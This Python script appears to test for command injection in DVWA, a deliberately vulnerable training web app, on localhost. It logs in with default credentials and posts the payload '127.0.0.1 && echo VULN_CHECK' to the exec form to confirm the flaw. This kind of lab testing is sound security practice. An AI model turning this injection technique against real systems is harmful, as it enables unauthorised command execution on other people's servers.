import requests
from bs4 import BeautifulSoup

# Config
LOGIN_URL = "http://localhost/login.php"
EXEC_URL = "http://localhost/vulnerabilities/exec/"
USERNAME = "admin"
PASSWORD = "password"
COOKIES = {"security": "low"}

def test_cmdi():
    s = requests.Session()
    s.cookies.update(COOKIES)
    
    # 1. Login
    print(f"[*] Logging in...")
    res = s.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})
    token = token['value'] if token else None # DVWA low might not have token on login, usually it does
    
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login'
    }
    if token: data['user_token'] = token
    
    res = s.post(LOGIN_URL, data=data)
    if "Logout" in res.text:
        print("[+] Logged in successfully.")
    else:
        print("[-] Login failed.")
        return

    # 2. Visit Exec
    print(f"[*] Visiting {EXEC_URL}...")
    res = s.get(EXEC_URL)
    soup = BeautifulSoup(res.text, 'html.parser')
    form = soup.find('form')
    if not form:
        print("[-] No form found on exec page.")
        print(f"Response: {res.text[:500]}")
        return
        
    print(f"[+] Found form: {form}")
    
    # 3. Inject
    action = form.get('action') 
    # Handle # action
    if action == '#': post_url = EXEC_URL
    elif not action: post_url = EXEC_URL
    else: post_url = action # handle full/relative
    
    print(f"[*] Posting to {post_url}")
    
    payload = "127.0.0.1 && echo VULN_CHECK"
    data = {
        'ip': payload,
        'Submit': 'Submit'
    }
    
    print(f"[*] Sending payload: {payload}")
    # Timeout 10s
    try:
        res = s.post(post_url, data=data, timeout=10)
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return
        
    print(f"[*] Response Code: {res.status_code}")
    if "VULN_CHECK" in res.text:
        print("[!] CRITICAL: VULN_CHECK found in response!")
        print(res.text[:1000]) # Print context
    else:
        print("[-] Vulnerability NOT confirmed.")
        print("Response Snippet:")
        print(res.text[:1000])

if __name__ == "__main__":
    test_cmdi()
